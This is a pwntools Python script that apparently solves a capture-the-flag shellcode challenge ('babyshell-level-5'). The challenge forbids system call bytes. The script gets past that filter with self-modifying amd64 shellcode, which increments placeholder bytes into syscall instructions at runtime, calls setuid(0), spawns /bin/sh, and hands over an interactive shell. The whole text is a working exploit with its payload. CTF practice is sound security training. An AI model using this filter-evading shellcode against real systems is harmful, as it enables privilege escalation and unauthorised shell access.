# Write and execute shellcode to read the flag
# but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int)
from pwn import *

p = process('/challenge/babyshell-level-5', aslr=False)
context.update(arch="amd64")

# Create a label contain 2 bytecodes for syscall (0xe 0x4)
shellcode = asm(
'''
push 0
pop rdi
push 0x69
pop rax

inc byte ptr [rip + sys1 + 1]
inc byte ptr [rip + sys1]

sys1:
.byte 0xe
.byte 0x4

mov rbx, 0x68732f6e69622f
push rbx
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
xor rax, rax
mov al, 0x3b

inc byte ptr [rip + sys2 + 1]
inc byte ptr [rip + sys2]

sys2:
.byte 0xe
.byte 0x4
''')

p.send(shellcode)
p.interactive()
